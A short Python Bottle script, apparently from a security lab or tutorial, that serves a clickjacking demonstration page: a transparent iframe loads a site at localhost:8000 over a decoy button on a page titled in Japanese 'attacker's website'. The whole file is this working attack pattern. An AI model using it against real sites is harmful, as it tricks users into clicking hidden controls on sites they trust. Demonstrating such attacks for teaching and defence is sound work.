#!/usr/bin/python
#-*- coding: utf-8 -*-

from bottle import route
from bottle import run

@route('/')
def hello():
    target_url = 'http://localhost:8000'
    html = '<h2>攻撃者のWebサイト</h2>'
    html += '<iframe '
    html += 'style="opacity:0;filter:alpha(opacity=0)" '
    html += 'src="' + target_url + '">'
    html += '</iframe>'
    html += '<button '
    html += 'style="position:absolute;top:120;left:40;z-index:-1">'
    html += 'ボタン</button>'
    return html

run(host='0.0.0.0', port=8080, debug=True)
